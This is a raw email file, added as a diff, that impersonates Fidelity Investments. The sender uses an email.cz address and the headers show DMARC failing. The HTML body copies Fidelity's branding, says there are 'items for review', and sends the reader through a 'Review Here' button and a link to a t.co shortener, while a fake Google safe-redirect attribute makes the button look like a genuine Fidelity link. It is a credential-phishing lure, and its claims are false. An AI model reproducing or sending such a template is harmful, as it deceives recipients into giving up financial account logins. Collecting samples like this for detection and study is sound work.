@@ -1,0 +1,206 @@
+Return-Path: <fidelity-zingerpie@email.cz>
+Received: from email.cz ([95.110.174.132])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 9f5fibpqvt8t4b4um83e9e98u48bdie24v2lipo1
+ for zingerpie@kfcreview.com;
+ Fri, 05 Dec 2025 23:02:48 +0000 (UTC)
+Received-SPF: neutral (spfCheck: 95.110.174.132 is neither permitted nor denied by domain of email.cz) client-ip=95.110.174.132; envelope-from=fidelity-zingerpie@email.cz; helo=email.cz;
+Authentication-Results: amazonses.com;
+ spf=neutral (spfCheck: 95.110.174.132 is neither permitted nor denied by domain of email.cz) client-ip=95.110.174.132; envelope-from=fidelity-zingerpie@email.cz; helo=email.cz;
+ dmarc=fail header.from=email.cz;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFHdHd1dVR1dXlsdlB2bURDbk1nSFlMRjBMdjgxTjZqU1M0ZmorcVNMeHA4S3hseW4rZzN6bkF5YTVsRVdWS3p0S0k0SDFuQ3haRzNuMlU3V3p1WDU5WWIvWUhmRkZNYWNzcjJOQ2d1TGJCWXNpS0d6NVBVVTBJZ2VRZ1Q1cXRYZ0RHdFM2ZlpTdU5lMDR1M29rZm1TY09BZkdNaGltRUVkL29xdVBQMzBuSHg4VnFhQi9aMXFVV1cxVk55MXBVV0lheVZIQkhBQkxmdk94R3RnRDZZTnhrcWw5NGVJTWFzRjA1YStzb2x2bzVzYjdaNmtSeTFSMnBqNHFrUEE3REs4VTBQMXBVZlhsem9IOWVPR0NYUnY0aHM4Tm40amFXbWlhcE9ERTJ5Z05QeUp3RW5icXd3d2QyM1h1d01KL3FCbVU9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=aD3K04ur5HIKmW2xu+uZwgW74uKxwBp4BDb6xlcsxRuBQ7s1W6WM2RhFwY1RIVhQmfAG/ZQJ2AigKdX7vXgUyesF0l4hgjzBc7I5UswzeXHz/3nZXDc+ePVWLqwqH0nd3UmoqyyjbEngNU4Wl51q+5CQaBVaWPuukghFyrBkkAQ=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1764975769; v=1; bh=yruH0C/DGoXc4+FV19XCgtHqKOdiEx2SrEoPXGCJb1E=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "Fidelity Investments" <fidelity-zingerpie@email.cz>
+To: zingerpie@kfcreview.com
+Subject: Important information from Fidelity Investments About Your Account
+Date: 06 Dec 2025 00:02:35 +0100
+Message-ID: <20251206000235.151AAF75A42E83ED@email.cz>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META content=3D"text/html; charset=3DUTF-8" http-equiv=3DContent-Type>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.21615"></HEAD>
+<BODY>
+<TABLE class=3Dv1stylingblock-content-wrapper style=3D"BOX-SIZING: border-b=
+ox; BORDER-COLLAPSE: separate; MIN-WIDTH: 100%" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3D"v1stylingblock-content-wrapper v1camarker-inner" style=3D'BOX-=
+SIZING: border-box; FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid =
+Sans", "Helvetica Neue", Arial, Helvetica, sans-serif !important'>
+<DIV class=3Dv1preheader-custom-wrapper style=3D'BOX-SIZING: border-box; MA=
+X-WIDTH: 600px !important; FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, =
+"Droid Sans", "Helvetica Neue", Arial, Helvetica, sans-serif !important; BO=
+RDER-BOTTOM: rgb(128,194,64) 3px solid; MARGIN: 0px auto; BACKGROUND-COLOR:=
+ rgb(2,113,57)'>
+<DIV class=3Dv1preheader-custom style=3D'BOX-SIZING: border-box; MAX-WIDTH:=
+ 600px; FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid Sans", "Helv=
+etica Neue", Arial, Helvetica, sans-serif !important; WIDTH: 600px; MARGIN:=
+ 0px auto; DISPLAY: table'>
+<DIV class=3Dv1first style=3D'BOX-SIZING: border-box; FONT-SIZE: 11px; FONT=
+-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid Sans", "Helvetica Neue",=
+ Arial, Helvetica, sans-serif !important; VERTICAL-ALIGN: middle; COLOR: rg=
+b(255,255,255); PADDING-BOTTOM: 10px; TEXT-ALIGN: left; PADDING-TOP: 10px; =
+PADDING-LEFT: 10px; DISPLAY: table-cell; LINE-HEIGHT: 12px; PADDING-RIGHT: =
+10px'>View your personalized tax form schedule.</DIV>
+<DIV class=3Dv1last style=3D'BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-=
+FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid Sans", "Helvetica Neue", =
+Arial, Helvetica, sans-serif !important; VERTICAL-ALIGN: middle; COLOR: rgb=
+(255,255,255); PADDING-BOTTOM: 10px; TEXT-ALIGN: right; PADDING-TOP: 10px; =
+PADDING-LEFT: 10px; DISPLAY: table-cell; LINE-HEIGHT: 12px; PADDING-RIGHT: =
+10px'>
+<A style=3D'BOX-SIZING: border-box; TEXT-DECORATION: underline !important; =
+FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid Sans", "Helvetica Ne=
+ue", Arial, Helvetica, sans-serif !important; COLOR: rgb(255,255,255) !impo=
+rtant; BACKGROUND-COLOR: transparent' href=3D"https://view.fidelityinvestme=
+nts.com/?qs=3D3d2bc68544cff10b3c6c648f5c65051b841b02dd48800866a3cd7c5a983fe=
+a26e159eacab38d92b9f4b3f58067ac1225428f367c915697895080366c02284991f6d6e40d=
+e6373f44f48804839847390b" rel=3Dnoreferrer target=3D_blank>
+View in a browser</A></DIV></DIV></DIV></TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1stylingblock-content-wrapper style=3D"BOX-SIZING: border-b=
+ox; BORDER-COLLAPSE: separate; MIN-WIDTH: 100%" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3D"v1stylingblock-content-wrapper v1camarker-inner" style=3D'BOX-=
+SIZING: border-box; FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid =
+Sans", "Helvetica Neue", Arial, Helvetica, sans-serif !important'>
+<DIV class=3Dv1header-wrapper style=3D'BOX-SIZING: border-box; MAX-WIDTH: 6=
+00px !important; FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid San=
+s", "Helvetica Neue", Arial, Helvetica, sans-serif !important; BORDER-BOTTO=
+M: rgb(238,238,238) 1px solid; MARGIN: 0px auto; BACKGROUND-COLOR: rgb(54,1=
+35,39)'>
+<DIV class=3Dv1header style=3D'BOX-SIZING: border-box; MAX-WIDTH: 600px; FO=
+NT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid Sans", "Helvetica Neue=
+", Arial, Helvetica, sans-serif !important; WIDTH: 600px; MARGIN: 0px auto;=
+ DISPLAY: table'>
+<DIV class=3Dv1first style=3D'BOX-SIZING: border-box; FONT-SIZE: 12px; FONT=
+-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid Sans", "Helvetica Neue",=
+ Arial, Helvetica, sans-serif !important; VERTICAL-ALIGN: middle; COLOR: rg=
+b(255,255,255) !important; PADDING-BOTTOM: 5px; TEXT-ALIGN: left; PADDING-T=
+OP: 5px; PADDING-LEFT: 10px; DISPLAY: table-cell; LINE-HEIGHT: 18px; PADDIN=
+G-RIGHT: 10px'>
+<A title=3D"Fidelity Investments" style=3D'BOX-SIZING: border-box; TEXT-DEC=
+ORATION: underline !important; FONT-FAMILY: fidelity_sans, "Segoe UI", Robo=
+to, "Droid Sans", "Helvetica Neue", Arial, Helvetica, sans-serif !important=
+; COLOR: rgb(255,255,255) !important; BACKGROUND-COLOR: transparent' href=
+=3D"https://click.fidelityinvestments.com/u/?qs=3D191e0850d22c83ce6289e0845=
+5cf506e8a8a17c53a9a53e15970fb840e7def76a619e5bef90eb398e97c72a98181855275f7=
+b42f7df4a513123a4c508ff1da32" rel=3Dnoreferrer target=3D_blank>
+<IMG class=3Dv1desktop-only style=3D"BOX-SIZING: border-box; OVERFLOW: visi=
+ble; MAX-WIDTH: none; BORDER-TOP: 0px; HEIGHT: 54px; BORDER-RIGHT: 0px; WID=
+TH: 168px; VERTICAL-ALIGN: middle; BORDER-BOTTOM: 0px; OUTLINE-WIDTH: 0px; =
+OUTLINE-STYLE: none; BORDER-LEFT: 0px; DISPLAY: inline-block !important; OU=
+TLINE-COLOR: invert" border=3D0 src=3D"https://image.fidelityinvestments.co=
+m/lib/fe8c1570706c0c797c/m/1/bdd2fd50-d503-4c55-a1b4-0169601b22a4.png" widt=
+h=3D168 height=3D54></A></DIV>
+<DIV class=3Dv1last style=3D'BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-=
+FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid Sans", "Helvetica Neue", =
+Arial, Helvetica, sans-serif !important; VERTICAL-ALIGN: middle; COLOR: rgb=
+(255,255,255) !important; PADDING-BOTTOM: 5px; TEXT-ALIGN: right; PADDING-T=
+OP: 5px; PADDING-LEFT: 10px; DISPLAY: table-cell; LINE-HEIGHT: 18px; PADDIN=
+G-RIGHT: 10px'>zingerpie@kfcreview.com</DIV></DIV></DIV></TD></TR></TBODY><=
+/TABLE>
+<DIV class=3Dv1content-wrapper style=3D'BOX-SIZING: border-box; MAX-WIDTH: =
+600px; FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid Sans", "Helve=
+tica Neue", Arial, Helvetica, sans-serif !important; MARGIN: 0px auto'>
+<DIV class=3Dv1content-main style=3D'BOX-SIZING: border-box; FONT-FAMILY: f=
+idelity_sans, "Segoe UI", Roboto, "Droid Sans", "Helvetica Neue", Arial, He=
+lvetica, sans-serif !important; BORDER-BOTTOM: rgb(2,113,57) 10px solid'>
+<DIV class=3Dv1content-top style=3D'BOX-SIZING: border-box; FONT-SIZE: 16px=
+; FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid Sans", "Helvetica =
+Neue", Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px=
+; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(3,3,3); FONT-STYLE: no=
+rmal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACK=
+GROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: n=
+ormal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial'></DIV>
+<DIV class=3Dv1content-body style=3D'BOX-SIZING: border-box; FONT-SIZE: 16p=
+x; FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid Sans", "Helvetica=
+ Neue", Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0p=
+x; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(3,3,3); PADDING-BOTTO=
+M: 48px; FONT-STYLE: normal; TEXT-ALIGN: left; PADDING-TOP: 15px; PADDING-L=
+EFT: 48px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; LINE-HEIGHT: 24px=
+; PADDING-RIGHT: 48px; BACKGROUND-COLOR:=20
+rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
+riant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickne=
+ss: initial; text-decoration-style: initial; text-decoration-color: initial=
+'>
+<TABLE class=3Dv1stylingblock-content-wrapper style=3D"BOX-SIZING: border-b=
+ox; BORDER-COLLAPSE: separate; MIN-WIDTH: 100%" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3D"v1stylingblock-content-wrapper v1camarker-inner" style=3D'BOX-=
+SIZING: border-box; FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid =
+Sans", "Helvetica Neue", Arial, Helvetica, sans-serif !important'>
+<H1 style=3D"BOX-SIZING: border-box; FONT-SIZE: 32px; FONT-WEIGHT: 400; COL=
+OR: rgb(34,34,34); MARGIN: 10px 0px 15px; LETTER-SPACING: -0.03em; LINE-HEI=
+GHT: 36px">We have some items for review</H1>
+<P>You have items available for review, on the account/s enrolled for trade=
+=2E To review the items log in to your account below to receive a one-time =
+code and access review.</P>
+<P>&nbsp;</P></TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1stylingblock-content-wrapper style=3D"BOX-SIZING: border-b=
+ox; BORDER-COLLAPSE: separate; MIN-WIDTH: 100%" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3D"v1stylingblock-content-wrapper v1camarker-inner" style=3D'BOX-=
+SIZING: border-box; FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid =
+Sans", "Helvetica Neue", Arial, Helvetica, sans-serif !important'>
+<TABLE class=3Dv1stylingblock-content-wrapper style=3D"BOX-SIZING: border-b=
+ox; BORDER-COLLAPSE: separate; MIN-WIDTH: 100%" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3D"v1stylingblock-content-wrapper v1camarker-inner" style=3D'BOX-=
+SIZING: border-box; FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid =
+Sans", "Helvetica Neue", Arial, Helvetica, sans-serif !important'>
+<TABLE style=3D'FONT-SIZE: small; FONT-FAMILY: "Fidelity Sans", "Trebuchet =
+MS", Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
+ORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPH=
+ANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,25=
+5); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text=
+-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-sty=
+le: initial; text-decoration-color: initial'=20
+cellSpacing=3D0 cellPadding=3D0 width=3D143 align=3Dleft border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-FAMILY: Arial, Helvetica, sans-serif; MARGIN: 0px" align=
+=3Dleft>
+<A title=3D"Visit NetBenefits" style=3D'FONT-SIZE: 16px; TEXT-DECORATION: n=
+one; FONT-FAMILY: "Fidelity Sans", "Trebuchet MS", Arial, sans-serif; WIDTH=
+: 175px; FONT-WEIGHT: bold; COLOR: rgb(255,255,255); TEXT-ALIGN: center; DI=
+SPLAY: inline-block; LETTER-SPACING: 0px; LINE-HEIGHT: 40px; BACKGROUND-COL=
+OR: rgb(54,135,39); border-radius: 20px' href=3D"https://t.co/u8yd0Dzr5u" t=
+arget=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://click.fideli=
+tyinvestments.com/u/?qs%3Dc97ee85c9705ff6602789d03a9e70f53665a3a00ce586a50c=
+a4916WEvUWrf6DhjnqEKYiz2mB4Hkydmd7y55mGtb2QN5NCxVVDa3153df1ae41cfd570e94b1e=
+b&amp;source=3Dgmail&amp;ust=3D1761749171210000&amp;usg=3DAOvVaw0bPCeoVX84o=
+GvFCoEOTUwI"><STRONG>Review Here</STRONG></A></TD></TR></TBODY></TABLE>
+<P>&nbsp;</P>
+<P>&nbsp;</P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1stylingblock-content-wrapper style=3D"BOX-SIZING: border-b=
+ox; BORDER-COLLAPSE: separate; MIN-WIDTH: 100%" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3D"v1stylingblock-content-wrapper v1camarker-inner" style=3D'BOX-=
+SIZING: border-box; FONT-FAMILY: fidelity_sans, "Segoe UI", Roboto, "Droid =
+Sans", "Helvetica Neue", Arial, Helvetica, sans-serif !important'>
+Or&nbsp;<A style=3D'BOX-SIZING: border-box; TEXT-DECORATION: none; FONT-FAM=
+ILY: fidelity_sans, "Segoe UI", Roboto, "Droid Sans", "Helvetica Neue", Ari=
+al, Helvetica, sans-serif !important; COLOR: rgb(2,113,57) !important; BACK=
+GROUND-COLOR: transparent' href=3D"https://t.co/u8yd0Dzr5u" rel=3Dnoreferre=
+r target=3D_blank>view your schedule now</A>. You can also log in to your a=
+ccount, go to<SPAN>&nbsp;</SPAN><I style=3D"BOX-SIZING: border-box">Account=
+s &amp; Trade</I>, then select<SPAN>&nbsp;</SPAN>
+<I style=3D"BOX-SIZING: border-box">review &amp; Information</I>.<BR style=
+=3D"BOX-SIZING: border-box">&nbsp;</TD></TR></TBODY></TABLE></DIV><BR class=
+=3DApple-interchange-newline></DIV></DIV></BODY></HTML>
